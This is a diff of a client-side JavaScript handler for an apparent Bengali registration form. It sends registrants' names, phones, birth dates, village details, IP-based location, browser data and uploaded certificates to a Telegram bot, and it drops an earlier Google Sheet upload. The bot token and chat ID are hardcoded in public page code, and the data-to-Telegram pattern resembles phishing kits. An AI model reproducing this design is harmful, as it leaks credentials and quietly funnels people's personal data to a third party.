@@ -70,8 +70,8 @@ form.addEventListener('submit', async (e) => {
   // Show loading
   loadingDiv.style.display = 'flex';
 
-  const token = "7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
-  const chatId = "7079142411";
+  const token = "7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s"; // এখানে আপনার বট টোকেন দিন
+  const chatId = "7079142411"; // এখানে আপনার চ্যাট আইডি দিন
 
   const name = document.getElementById('name').value;
   const phone = document.getElementById('phone').value;
@@ -108,14 +108,23 @@ form.addEventListener('submit', async (e) => {
   const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
   const browser = navigator.userAgent;
 
+  // বাংলায় বিস্তারিত মেসেজ
   let message = `নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
 
+  // Sheet-ready CSV লাইন
+  let sheetLine = `${name},${phone},${dob},${age},${heightFeet},${heightInch},${gender},${ward},${village},${ip},${country},${city},${device}`;
+
+  // মেসেজ + CSV টেলিগ্রামে পাঠানো
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `${message}\n\n📄 Sheet-ready:\n${sheetLine}`
+    })
   });
 
+  // ফাইল পাঠানোর হেল্পার
   async function sendFile(file) {
     if (file) {
       const formData = new FormData();
@@ -136,19 +145,6 @@ form.addEventListener('submit', async (e) => {
 
   await sendFile(certificateFile);
   for (const f of extraFiles) await sendFile(f);
-
-  // Google Sheet এ পাঠানো
-  try {
-    await fetch("https://script.google.com/macros/s/AKfycbxdHxGFdM-5yifURzZnBtoNMrF9UWp2A6wcFtO591_Ki3_oRDoyERFECQtZiYgmg6FMcw/exec", {
-      method: "POST",
-      body: JSON.stringify({
-        name, phone, dob, age, heightFeet, heightInch,
-        gender, ward, village, ip, country, city, device, browser
-      })
-    });
-  } catch (err) {
-    console.log("Google Sheet Error", err);
-  }
 
   // Hide loading + show success
   loadingDiv.style.display = 'none';
